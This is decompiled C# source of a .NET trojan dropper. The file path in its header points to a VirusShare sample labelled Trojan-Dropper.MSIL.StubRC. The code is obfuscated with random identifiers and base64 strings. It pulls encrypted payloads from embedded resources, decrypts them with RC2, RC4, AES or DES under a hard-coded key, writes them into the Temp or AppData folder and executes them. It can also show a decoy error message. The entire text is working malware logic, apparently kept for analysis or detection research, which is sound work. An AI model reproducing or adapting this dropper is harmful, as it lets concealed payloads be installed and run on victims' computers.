// Decompiled with JetBrains decompiler
// Type: ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK
// Assembly: FFA, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3FF3590B-33A4-431B-BECB-91674CE4FF26
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Dropper.MSIL.StubRC.jew-747f15512f3b04420d0bc2264192fb1f8a4cdf81993afb191ae835d86b650cd8.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK
{
  public static string E5O43M9LBEWEMIUS8N5YW5GQ5W3JG1 = "No";
  public static string DZEHNG2887BQV1LUT5804LVQF35I36 = "No";
  public static string CYCGLE17769PUYKTS4683JUPE23H15 = "TliFozFBNefBCLjQtJpv";

  public static void D02G04DK88YP9OW7T6VYH973FDS8PT()
  {
    ResourceManager resourceManager = new ResourceManager("ZsMfaPuEFDIsltX", Assembly.GetExecutingAssembly());
    int num = 0;
    do
    {
      string Left1 = Conversions.ToString(resourceManager.GetObject("XXWbMTaqRR" + Conversions.ToString(num)));
      string s1 = Conversions.ToString(resourceManager.GetObject("gWZRpTxvdS" + Conversions.ToString(num)));
      string Left2 = Conversions.ToString(resourceManager.GetObject("mdUhrbaOOp" + Conversions.ToString(num)));
      string s2 = Conversions.ToString(resourceManager.GetObject("xKmGlJbnbZ" + Conversions.ToString(num)));
      if (Operators.CompareString(Left2, Encoding.UTF8.GetString(Convert.FromBase64String("UkMy")), false) == 0)
      {
        byte[] array = ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.R4C42XB9ODKOLT66LMS9VGREIV1TFC(Convert.FromBase64String(s2), "kjzEGxXmePwyTvBPZtHuhIedGmEquUuGzSPlIgYUgwMhVeCwac");
        if (Operators.CompareString(Left1, Encoding.UTF8.GetString(Convert.FromBase64String("VGVtcA==")), false) == 0)
          Left1 = Path.GetTempPath();
        else if (Operators.CompareString(Left1, Encoding.UTF8.GetString(Convert.FromBase64String("QXBwRGF0YQ==")), false) == 0)
          Left1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        FileStream fileStream = File.Create(Left1 + "\\" + Encoding.UTF8.GetString(Convert.FromBase64String(s1)));
        fileStream.Write(array, 0, array.Length);
        fileStream.Close();
        ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.KI0OHBKRGF7XGV4E2D47OGE0NL1GW1(Left1 + "\\" + Encoding.UTF8.GetString(Convert.FromBase64String(s1)));
      }
      else if (Operators.CompareString(Left2, Encoding.UTF8.GetString(Convert.FromBase64String("UkM0")), false) == 0)
      {
        byte[] array = ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.W57HWX4B7R2FT73VHNNMQGBG109KNO(Convert.FromBase64String(s2), "kjzEGxXmePwyTvBPZtHuhIedGmEquUuGzSPlIgYUgwMhVeCwac");
        if (Operators.CompareString(Left1, Encoding.UTF8.GetString(Convert.FromBase64String("VGVtcA==")), false) == 0)
          Left1 = Path.GetTempPath();
        else if (Operators.CompareString(Left1, Encoding.UTF8.GetString(Convert.FromBase64String("QXBwRGF0YQ==")), false) == 0)
          Left1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        FileStream fileStream = File.Create(Left1 + "\\" + Encoding.UTF8.GetString(Convert.FromBase64String(s1)));
        fileStream.Write(array, 0, array.Length);
        fileStream.Close();
        ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.KI0OHBKRGF7XGV4E2D47OGE0NL1GW1(Left1 + "\\" + Encoding.UTF8.GetString(Convert.FromBase64String(s1)));
      }
      else if (Operators.CompareString(Left2, Encoding.UTF8.GetString(Convert.FromBase64String("QUVT")), false) == 0)
      {
        byte[] array = ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.VUXNIN9RHSUWR8SE3ZR6ZS30XXOFXD(Convert.FromBase64String(s2), "kjzEGxXmePwyTvBPZtHuhIedGmEquUuGzSPlIgYUgwMhVeCwac");
        if (Operators.CompareString(Left1, Encoding.UTF8.GetString(Convert.FromBase64String("VGVtcA==")), false) == 0)
          Left1 = Path.GetTempPath();
        else if (Operators.CompareString(Left1, Encoding.UTF8.GetString(Convert.FromBase64String("QXBwRGF0YQ==")), false) == 0)
          Left1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        FileStream fileStream = File.Create(Left1 + "\\" + Encoding.UTF8.GetString(Convert.FromBase64String(s1)));
        fileStream.Write(array, 0, array.Length);
        fileStream.Close();
        ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.KI0OHBKRGF7XGV4E2D47OGE0NL1GW1(Left1 + "\\" + Encoding.UTF8.GetString(Convert.FromBase64String(s1)));
      }
      else if (Operators.CompareString(Left2, Encoding.UTF8.GetString(Convert.FromBase64String("REVT")), false) == 0)
      {
        byte[] array = ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.GPDPFIZRQLYWCR8C0IKU90GNK4FS6J(Convert.FromBase64String(s2), "kjzEGxXmePwyTvBPZtHuhIedGmEquUuGzSPlIgYUgwMhVeCwac");
        if (Operators.CompareString(Left1, Encoding.UTF8.GetString(Convert.FromBase64String("VGVtcA==")), false) == 0)
          Left1 = Path.GetTempPath();
        else if (Operators.CompareString(Left1, Encoding.UTF8.GetString(Convert.FromBase64String("QXBwRGF0YQ==")), false) == 0)
          Left1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        FileStream fileStream = File.Create(Left1 + "\\" + Encoding.UTF8.GetString(Convert.FromBase64String(s1)));
        fileStream.Write(array, 0, array.Length);
        fileStream.Close();
        ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.KI0OHBKRGF7XGV4E2D47OGE0NL1GW1(Left1 + "\\" + Encoding.UTF8.GetString(Convert.FromBase64String(s1)));
      }
      checked { ++num; }
    }
    while (num <= 2);
  }

  public static string Y3Z80KZ17E0U5IW06YKQQPTJEJ4DCN(
    string GOQ1GHNUQBMYDQMF17760ZUZKTS479,
    string T0LG5ST8RV5CQZQH1GFYLXNQ9QYU75)
  {
    string str1 = (string) null;
    char[] array = new char[256];
    int CharCode = 0;
    do
    {
      array[CharCode] = Strings.Chr(CharCode);
      checked { ++CharCode; }
    }
    while (CharCode <= (int) byte.MaxValue);
    string str2 = GOQ1GHNUQBMYDQMF17760ZUZKTS479;
    string str3 = T0LG5ST8RV5CQZQH1GFYLXNQ9QYU75;
    int length1 = str2.Length;
    int length2 = str3.Length;
    if (length1 > length2)
    {
      int num1 = checked (length1 - length2 - 1);
      int num2 = 0;
      while (num2 <= num1)
      {
        str3 += str3;
        if (str3.Length > length1)
        {
          str3 = str3.Substring(0, length1);
          break;
        }
        checked { ++num2; }
      }
    }
    else if (length1 < length2)
      str3 = str3.Substring(0, length1);
    int num = checked (length1 - 1);
    int index = 0;
    while (index <= num)
    {
      str1 += Conversions.ToString(array[checked (Array.IndexOf<char>(array, str2[index]) - Array.IndexOf<char>(array, str3[index])) % 256]);
      checked { ++index; }
    }
    return str1;
  }

  public static byte[] W57HWX4B7R2FT73VHNNMQGBG109KNO(
    byte[] N4F0YMN2LPY6KTKBU09SFRHK3KSO1Y,
    string FBNCRGNRPX9JOPVC9TUHLY5WJGGFI8)
  {
    uint[] numArray1 = new uint[256];
    byte[] numArray2 = new byte[checked (N4F0YMN2LPY6KTKBU09SFRHK3KSO1Y.Length - 1 + 1)];
    byte[] bytes = Encoding.Default.GetBytes(FBNCRGNRPX9JOPVC9TUHLY5WJGGFI8);
    uint index1 = 0;
    do
    {
      numArray1[checked ((int) index1)] = index1;
      checked { ++index1; }
    }
    while (index1 <= (uint) byte.MaxValue);
    uint index2 = 0;
    do
    {
      uint index3 = checked ((uint) ((long) (index3 + (uint) bytes[(int) unchecked ((long) index2 % (long) bytes.Length)] + numArray1[(int) index2]) & (long) byte.MaxValue));
      uint num = numArray1[checked ((int) index2)];
      numArray1[checked ((int) index2)] = numArray1[checked ((int) index3)];
      numArray1[checked ((int) index3)] = num;
      checked { ++index2; }
    }
    while (index2 <= (uint) byte.MaxValue);
    uint index4 = 0;
    uint index5 = 0;
    int num1 = checked (numArray2.Length - 1);
    int index6 = 0;
    while (index6 <= num1)
    {
      index4 = checked ((uint) ((long) index4 + 1L & (long) byte.MaxValue));
      index5 = checked ((uint) ((long) (index5 + numArray1[(int) index4]) & (long) byte.MaxValue));
      uint num2 = numArray1[checked ((int) index4)];
      numArray1[checked ((int) index4)] = numArray1[checked ((int) index5)];
      numArray1[checked ((int) index5)] = num2;
      numArray2[index6] = checked ((byte) ((int) N4F0YMN2LPY6KTKBU09SFRHK3KSO1Y[index6] ^ unchecked ((int) numArray1[checked ((int) ((long) (numArray1[(int) index4] + numArray1[(int) index5]) & (long) byte.MaxValue))])));
      checked { ++index6; }
    }
    return numArray2;
  }

  public static byte[] R4C42XB9ODKOLT66LMS9VGREIV1TFC(
    byte[] HE6KD7HOCC3TCR10X0Z3KCB7JHWCSW,
    string IQS3IJPWSDO1FSOH3908C2W2MVU69B)
  {
    RC2CryptoServiceProvider cryptoServiceProvider = new RC2CryptoServiceProvider();
    byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(IQS3IJPWSDO1FSOH3908C2W2MVU69B));
    cryptoServiceProvider.Key = hash;
    cryptoServiceProvider.Mode = CipherMode.ECB;
    return cryptoServiceProvider.CreateDecryptor().TransformFinalBlock(HE6KD7HOCC3TCR10X0Z3KCB7JHWCSW, 0, HE6KD7HOCC3TCR10X0Z3KCB7JHWCSW.Length);
  }

  public static byte[] VUXNIN9RHSUWR8SE3ZR6ZS30XXOFXD(
    byte[] HE6KD7HOCC3TCR10X0Z3KCB7JHWCSW,
    string IQS3IJPWSDO1FSOH3908C2W2MVU69B)
  {
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
    byte[] destinationArray = new byte[32];
    byte[] hash = cryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(IQS3IJPWSDO1FSOH3908C2W2MVU69B));
    Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
    Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
    rijndaelManaged.Key = destinationArray;
    rijndaelManaged.Mode = CipherMode.ECB;
    return rijndaelManaged.CreateDecryptor().TransformFinalBlock(HE6KD7HOCC3TCR10X0Z3KCB7JHWCSW, 0, HE6KD7HOCC3TCR10X0Z3KCB7JHWCSW.Length);
  }

  public static byte[] GPDPFIZRQLYWCR8C0IKU90GNK4FS6J(
    byte[] HE6KD7HOCC3TCR10X0Z3KCB7JHWCSW,
    string IQS3IJPWSDO1FSOH3908C2W2MVU69B)
  {
    DESCryptoServiceProvider cryptoServiceProvider1 = new DESCryptoServiceProvider();
    MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
    byte[] destinationArray = new byte[8];
    Array.Copy((Array) cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(IQS3IJPWSDO1FSOH3908C2W2MVU69B)), 0, (Array) destinationArray, 0, 8);
    cryptoServiceProvider1.Key = destinationArray;
    cryptoServiceProvider1.Mode = CipherMode.ECB;
    return cryptoServiceProvider1.CreateDecryptor().TransformFinalBlock(HE6KD7HOCC3TCR10X0Z3KCB7JHWCSW, 0, HE6KD7HOCC3TCR10X0Z3KCB7JHWCSW.Length);
  }

  public static void KI0OHBKRGF7XGV4E2D47OGE0NL1GW1(string QY1BPQW41KV9MZVO0GHGJ949U33EGI) => Process.Start(QY1BPQW41KV9MZVO0GHGJ949U33EGI);

  public static void GUEHQOCL44MS1KXJ1DUDKGTHXMTXU3(string JNKS45JKR8UFPCGTZSEBB0D3Y3O7W8)
  {
    try
    {
      Mutex.OpenExisting(JNKS45JKR8UFPCGTZSEBB0D3Y3O7W8);
      ProjectData.EndApp();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Mutex mutex = new Mutex(false, JNKS45JKR8UFPCGTZSEBB0D3Y3O7W8);
      ProjectData.ClearProjectError();
    }
  }

  [STAThread]
  public static void Main()
  {
    ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.GUEHQOCL44MS1KXJ1DUDKGTHXMTXU3(ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.CYCGLE17769PUYKTS4683JUPE23H15);
    if (Operators.CompareString(ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.E5O43M9LBEWEMIUS8N5YW5GQ5W3JG1, Encoding.UTF8.GetString(Convert.FromBase64String("WWVz")), false) == 0)
    {
      if (Operators.CompareString(ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.DZEHNG2887BQV1LUT5804LVQF35I36, Encoding.UTF8.GetString(Convert.FromBase64String("RXJyb3I=")), false) == 0)
      {
        int num1 = (int) MessageBox.Show(Encoding.UTF8.GetString(Convert.FromBase64String("Tm8=")), Encoding.UTF8.GetString(Convert.FromBase64String("Tm8=")), MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (Operators.CompareString(ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.DZEHNG2887BQV1LUT5804LVQF35I36, Encoding.UTF8.GetString(Convert.FromBase64String("V2FybmluZw==")), false) == 0)
      {
        int num2 = (int) MessageBox.Show(Encoding.UTF8.GetString(Convert.FromBase64String("Tm8=")), Encoding.UTF8.GetString(Convert.FromBase64String("Tm8=")), MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
      else if (Operators.CompareString(ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.DZEHNG2887BQV1LUT5804LVQF35I36, Encoding.UTF8.GetString(Convert.FromBase64String("SW5mb3JtYXRpb24=")), false) == 0)
      {
        int num3 = (int) MessageBox.Show(Encoding.UTF8.GetString(Convert.FromBase64String("Tm8=")), Encoding.UTF8.GetString(Convert.FromBase64String("Tm8=")), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
    }
    ytiDtkxJrqeQrOaoWnZdErpjCyVrQVSdgvRSblgK.D02G04DK88YP9OW7T6VYH973FDS8PT();
  }
}
